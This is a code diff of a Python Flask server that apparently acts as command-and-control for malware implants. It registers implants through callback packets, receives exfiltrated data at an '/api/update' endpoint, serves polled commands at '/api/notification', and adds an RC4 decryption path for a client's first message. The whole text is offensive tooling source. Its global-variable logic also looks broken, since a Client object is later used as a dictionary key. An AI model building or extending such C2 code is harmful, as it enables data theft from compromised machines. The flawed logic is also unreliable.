@@ -8,10 +8,14 @@ PACKET_CALLBACK = 0x1
 PACKET_SUCCESS = 0x2
 PACKET_ERROR = 0xFF
 PACKET_DATA = 0x3
+PACKET_BIG_DATA = 0x4
 
 app = Flask(__name__)
 app.secret_key = b'\xed\xa1\x80\t\xa5n_\xcd\xb7\xfc\x83\xa20\x13]\x9b\xfe\xf3\xc4\xd3\xa5'
 
+# should use rc4 for decryption
+first = False
+client = None
 
 class Client:
     def __init__(self, addr, data):
@@ -70,6 +74,8 @@ def process_callback(addr, data):
     client_id = data[1:5].hex().upper()
     print_debug(f'Callback: {client_id}')
     if client_id not in clients.keys():
+        global first
+        first = True
         # add client to list
         clients[client_id] = Client(addr, data)
         return client_id
@@ -80,7 +86,16 @@ def process_callback(addr, data):
 # tentatively receive data from exfil
 @app.route('/api/update', methods=['POST'])
 def recv_data():
-    data = decrypt(request.data)
+    global first
+    global client
+    if first:
+        data = rc4_decrypt(request.data, clients[client].key)
+        client = None
+        first = False
+    else:
+        data = decrypt(request.data)
+
+
     if data[0] == PACKET_CALLBACK:
         client_id = process_callback(request.remote_addr, data)
         if client_id:
@@ -103,6 +118,8 @@ def recv_data():
 # provides commands for poll
 @app.route('/api/notification', methods=['GET'])
 def provide_command():
+    global first
+    global client
     client_id = request.args.get('id')
     client = clients.get(client_id)
     print_debug(client_id)
